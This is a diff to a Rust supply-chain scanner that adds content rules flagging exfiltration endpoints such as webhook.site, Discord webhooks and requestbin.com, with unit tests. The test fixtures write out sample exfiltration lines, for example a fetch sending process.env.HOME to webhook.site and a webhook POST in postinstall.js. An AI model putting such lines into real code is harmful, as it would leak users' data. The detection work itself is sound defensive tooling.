@@ -7,11 +7,17 @@
 //! we care about, because by the time these files exist the attacker
 //! has already written to disk.
 //!
-//! The first slice ships **path-based** indicators only. Content-based
-//! fingerprints (specific opening bytes of a known dropper, suspicious
-//! webhook URLs in `.npmrc`, etc.) are valuable but require reading
-//! every file — we punt on that until there's a real reproducible
-//! sample to match against.
+//! Two kinds of indicators ship today:
+//! - **Path-based** ([`RuleKind::PathSuffix`] / [`RuleKind::Basename`]):
+//!   match purely on a file's location. Cheap; the original v1 slice.
+//! - **Content-based** ([`RuleKind::ContentNeedle`]): match when a
+//!   file's *content* contains a known exfil endpoint string. The
+//!   needles are picked to never legitimately appear in workspace
+//!   files (`webhook.site`, `discord.com/api/webhooks/`, …) so the
+//!   false-positive rate stays close to zero. Reads are capped at
+//!   [`MAX_CONTENT_BYTES`] and only happen via [`scan_paths_in_root`]
+//!   (callers without filesystem access stay on the path-only
+//!   [`scan_paths`] entry point — no behaviour change for them).
 //!
 //! The catalog is statically compiled into the binary today. The
 //! roadmap calls for a `sakimori iocs update` that refreshes from a
@@ -25,7 +31,16 @@ use serde::Serialize;
 
 /// Version of the bundled catalog. Bump whenever the rule set changes
 /// so JSON consumers can tell which fingerprints were active.
-pub const CATALOG_VERSION: &str = "2026.05.15";
+pub const CATALOG_VERSION: &str = "2026.05.17";
+
+/// How many bytes of any single file the content scanner will read.
+/// 64 KiB easily covers `.npmrc`, `pyproject.toml`, lockfile metadata,
+/// individual workflow YAMLs, and `package.json` for all but the
+/// gnarliest monorepo roots. Files that exceed this are still
+/// considered — we just check the head; an exfil URL hidden past 64
+/// KiB is a contrived evasion we accept the false negative on rather
+/// than read every byte of every binary blob in the tree.
+pub const MAX_CONTENT_BYTES: usize = 64 * 1024;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
 #[serde(rename_all = "snake_case")]
@@ -64,6 +79,18 @@ pub enum RuleKind {
     PathSuffix,
     /// Match when the basename equals `pattern` (case-sensitive).
     Basename,
+    /// Match when the file's content contains the literal bytes
+    /// `needle` (case-insensitive ASCII). If `basename_filter` is
+    /// `Some`, only files with that exact basename are read — keeps
+    /// the content scanner from opening every `.txt` in the tree to
+    /// look for a needle that almost certainly isn't there. The
+    /// `pattern` field is unused for this kind (kept on [`Rule`] for
+    /// the common shape) and conventionally set to the needle for
+    /// readability of catalog tables.
+    ContentNeedle {
+        needle: &'static str,
+        basename_filter: Option<&'static str>,
+    },
 }
 
 /// The bundled catalog. Ordered so higher-confidence indicators appear
@@ -123,13 +150,60 @@ pub fn catalog() -> &'static [Rule] {
                           attempt. Inspect for `//*:_authToken=` or a \
                           non-default `registry=` line.",
         },
+        Rule {
+            id: "exfil.webhook-site",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "webhook.site",
+                basename_filter: None,
+            },
+            pattern: "webhook.site",
+            description: "Reference to `webhook.site` — a free request-\
+                          capture service routinely used as a one-off C2 \
+                          / exfiltration endpoint by supply-chain droppers. \
+                          Legitimate workspace files almost never embed it.",
+        },
+        Rule {
+            id: "exfil.discord-webhook",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "discord.com/api/webhooks/",
+                basename_filter: None,
+            },
+            pattern: "discord.com/api/webhooks/",
+            description: "Discord webhook URL — the canonical low-effort \
+                          exfil channel in recent npm / PyPI worm samples \
+                          (POST a JSON payload to the webhook and the \
+                          attacker reads the message). Inspect for an \
+                          embedded token after the path.",
+        },
+        Rule {
+            id: "exfil.requestbin",
+            family: "supplychain-generic",
+            severity: Severity::High,
+            kind: RuleKind::ContentNeedle {
+                needle: "requestbin.com",
+                basename_filter: None,
+            },
+            pattern: "requestbin.com",
+            description: "Reference to `requestbin.com` — another request-\
+                          capture service in the same threat family as \
+                          `webhook.site`. Legitimate use in a checkout is \
+                          vanishingly rare.",
+        },
     ]
 }
 
-/// Decide whether `path` matches any catalog rule. `path` should be
-/// **relative** to the workspace root — callers using
+/// Decide whether `path` matches any **path-based** catalog rule.
+/// `path` should be **relative** to the workspace root — callers using
 /// [`crate::tamper::Snapshot::files`] already get relative paths
 /// because the snapshot keys on them.
+///
+/// Content-based rules ([`RuleKind::ContentNeedle`]) are deliberately
+/// not evaluated here — they need filesystem access. Use
+/// [`scan_paths_in_root`] for the combined check.
 pub fn matches(path: &Path) -> Vec<&'static Rule> {
     let normalised = normalise(path);
     let basename = normalised
@@ -146,12 +220,122 @@ pub fn matches(path: &Path) -> Vec<&'static Rule> {
         let hit = match rule.kind {
             RuleKind::Basename => basename == rule.pattern,
             RuleKind::PathSuffix => path_ends_with(&normalised, rule.pattern),
+            RuleKind::ContentNeedle { .. } => false,
         };
         if hit {
             out.push(rule);
         }
     }
     out
+}
+
+/// Decide whether `bytes` (capped to [`MAX_CONTENT_BYTES`] by the
+/// caller) trips any content rule whose `basename_filter` matches the
+/// passed `basename` (or whose filter is `None`).
+///
+/// Case-insensitive ASCII match — exfil URLs in droppers are
+/// occasionally upper-cased to dodge naïve grep filters, and the
+/// canonical hostnames are all 7-bit anyway.
+pub fn matches_content(basename: &str, bytes: &[u8]) -> Vec<&'static Rule> {
+    let lower = bytes.to_ascii_lowercase();
+    let mut out = Vec::new();
+    for rule in catalog() {
+        let RuleKind::ContentNeedle {
+            needle,
+            basename_filter,
+        } = rule.kind
+        else {
+            continue;
+        };
+        if let Some(want) = basename_filter
+            && want != basename
+        {
+            continue;
+        }
+        if find_lower(&lower, needle.as_bytes()) {
+            out.push(rule);
+        }
+    }
+    out
+}
+
+/// Combined path-only + content scan rooted at `root`. For each path
+/// (interpreted as relative to `root`), evaluates path-based rules
+/// first, then — if any content rule passes its basename filter for
+/// this file — reads up to [`MAX_CONTENT_BYTES`] of the file once and
+/// runs the content rules against it. Read failures (file gone,
+/// permission denied) are silently treated as empty content; the
+/// scanner's job is to surface positives, not to invent rejections.
+pub fn scan_paths_in_root<'a, I, P>(root: &Path, paths: I) -> Vec<Finding>
+where
+    I: IntoIterator<Item = &'a P>,
+    P: AsRef<Path> + 'a + ?Sized,
+{
+    let mut out = Vec::new();
+    for p in paths {
+        let rel = p.as_ref();
+        for rule in matches(rel) {
+            out.push(Finding {
+                path: rel.to_path_buf(),
+                rule_id: rule.id,
+                family: rule.family,
+                severity: rule.severity,
+                description: rule.description,
+            });
+        }
+        let basename = rel.file_name().and_then(|n| n.to_str()).unwrap_or_default();
+        let any_content_rule_wants_this_file = catalog().iter().any(|r| match r.kind {
+            RuleKind::ContentNeedle {
+                basename_filter, ..
+            } => basename_filter.is_none_or(|want| want == basename),
+            _ => false,
+        });
+        if !any_content_rule_wants_this_file {
+            continue;
+        }
+        let abs = root.join(rel);
+        let bytes = read_capped(&abs, MAX_CONTENT_BYTES);
+        for rule in matches_content(basename, &bytes) {
+            out.push(Finding {
+                path: rel.to_path_buf(),
+                rule_id: rule.id,
+                family: rule.family,
+                severity: rule.severity,
+                description: rule.description,
+            });
+        }
+    }
+    out
+}
+
+fn read_capped(path: &Path, cap: usize) -> Vec<u8> {
+    use std::io::Read;
+    let Ok(mut f) = std::fs::File::open(path) else {
+        return Vec::new();
+    };
+    let mut buf = Vec::with_capacity(cap.min(8 * 1024));
+    if (&mut f).take(cap as u64).read_to_end(&mut buf).is_err() {
+        return Vec::new();
+    }
+    buf
+}
+
+/// Case-insensitive substring search. Input is already lowercased.
+/// `needle` may contain ASCII uppercase, which we lower on the fly to
+/// avoid allocating a second buffer for the needle each call.
+fn find_lower(haystack: &[u8], needle: &[u8]) -> bool {
+    if needle.is_empty() || needle.len() > haystack.len() {
+        return needle.is_empty();
+    }
+    'outer: for window_start in 0..=haystack.len() - needle.len() {
+        for (i, &n) in needle.iter().enumerate() {
+            if haystack[window_start + i] != n.to_ascii_lowercase() {
+                continue 'outer;
+            }
+        }
+        return true;
+    }
+    false
 }
 
 /// Scan an iterator of paths against the catalog. Findings are
@@ -314,6 +498,152 @@ mod tests {
             description: "",
         }]);
         assert!(high.has_high());
+    }
+
+    // --- content-rule tests -----------------------------------------------
+
+    #[test]
+    fn matches_skips_content_rules() {
+        // `matches()` is path-only — it must not return content rules,
+        // even when the path looks like one that might carry a needle.
+        let hits = matches(Path::new(".npmrc"));
+        for r in &hits {
+            assert!(
+                !matches!(r.kind, RuleKind::ContentNeedle { .. }),
+                "matches() leaked a content rule: {r:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn content_rule_fires_on_webhook_site_url() {
+        let bytes = b"const url = 'https://webhook.site/abcd-1234';";
+        let hits = matches_content("steal.js", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.webhook-site"));
+    }
+
+    #[test]
+    fn content_rule_is_case_insensitive() {
+        let bytes = b"FETCH https://Webhook.Site/UPPER";
+        let hits = matches_content("any.txt", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.webhook-site"));
+    }
+
+    #[test]
+    fn discord_webhook_url_trips_rule() {
+        let bytes = b"axios.post('https://discord.com/api/webhooks/123/abc', payload)";
+        let hits = matches_content("postinstall.js", bytes);
+        assert!(hits.iter().any(|r| r.id == "exfil.discord-webhook"));
+    }
+
+    #[test]
+    fn content_rules_quiet_on_benign_bytes() {
+        let hits = matches_content("README.md", b"This project uses webhooks internally.");
+        // No needle present → no hit.
+        assert!(hits.is_empty());
+    }
+
+    #[test]
+    fn scan_paths_in_root_reads_content_and_finds_needle() {
+        // Build a tmpdir with one needle-bearing file and one benign
+        // file. Verify the scanner only reports the malicious one.
+        let tmp = std::env::temp_dir().join(format!(
+            "sakimori-iocs-content-{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        std::fs::create_dir_all(tmp.join("a")).unwrap();
+        std::fs::write(
+            tmp.join("a/steal.js"),
+            "fetch('https://webhook.site/xxx', { body: process.env.HOME })",
+        )
+        .unwrap();
+        std::fs::write(tmp.join("a/clean.js"), "console.log('hello')").unwrap();
+        let paths = [PathBuf::from("a/steal.js"), PathBuf::from("a/clean.js")];
+        let findings = scan_paths_in_root(&tmp, paths.iter());
+        assert_eq!(findings.len(), 1, "got: {findings:#?}");
+        assert_eq!(findings[0].rule_id, "exfil.webhook-site");
+        assert_eq!(findings[0].path, PathBuf::from("a/steal.js"));
+        std::fs::remove_dir_all(&tmp).ok();
+    }
+
+    #[test]
+    fn scan_paths_in_root_combines_path_and_content_findings() {
+        // `.npmrc` is a path-rule hit (Medium); a needle inside is a
+        // separate content-rule hit (High). Both must appear so the
+        // reviewer sees the path-only Medium even on a clean file
+        // *and* the upgraded High on a dirty one.
+        let tmp = std::env::temp_dir().join(format!(
+            "sakimori-iocs-combined-{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        std::fs::create_dir_all(&tmp).unwrap();
+        std::fs::write(
+            tmp.join(".npmrc"),
+            "//registry.npmjs.org/:_authToken=fake\n# https://webhook.site/exfil\n",
+        )
+        .unwrap();
+        let paths = [PathBuf::from(".npmrc")];
+        let findings = scan_paths_in_root(&tmp, paths.iter());
+        let ids: Vec<&str> = findings.iter().map(|f| f.rule_id).collect();
+        assert!(
+            ids.contains(&"supplychain.npmrc-token"),
+            "missing path-rule hit: {ids:?}"
+        );
+        assert!(
+            ids.contains(&"exfil.webhook-site"),
+            "missing content-rule hit: {ids:?}"
+        );
+        std::fs::remove_dir_all(&tmp).ok();
+    }
+
+    #[test]
+    fn scan_paths_in_root_fails_open_on_missing_file() {
+        // Path is referenced but the file doesn't actually exist on
+        // disk (e.g. dropped after the diff snapshot). Content rules
+        // see empty bytes; no panic, no fabricated finding.
+        let tmp = std::env::temp_dir().join(format!(
+            "sakimori-iocs-missing-{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        std::fs::create_dir_all(&tmp).unwrap();
+        let paths = [PathBuf::from("ghost.js")];
+        let findings = scan_paths_in_root(&tmp, paths.iter());
+        assert!(findings.is_empty(), "got: {findings:#?}");
+        std::fs::remove_dir_all(&tmp).ok();
+    }
+
+    #[test]
+    fn content_read_is_capped() {
+        // A multi-MB file with the needle past the cap should NOT hit
+        // — documents the accepted false-negative for binary blobs.
+        let tmp = std::env::temp_dir().join(format!(
+            "sakimori-iocs-cap-{}",
+            std::time::SystemTime::now()
+                .duration_since(std::time::UNIX_EPOCH)
+                .unwrap()
+                .as_nanos()
+        ));
+        std::fs::create_dir_all(&tmp).unwrap();
+        let mut content = vec![b'.'; MAX_CONTENT_BYTES + 4096];
+        let needle = b"webhook.site/late";
+        content.extend_from_slice(needle);
+        std::fs::write(tmp.join("big.bin"), &content).unwrap();
+        let paths = [PathBuf::from("big.bin")];
+        let findings = scan_paths_in_root(&tmp, paths.iter());
+        assert!(
+            findings.is_empty(),
+            "needle past cap should be a documented miss: {findings:#?}"
+        );
+        std::fs::remove_dir_all(&tmp).ok();
     }
 
     #[test]
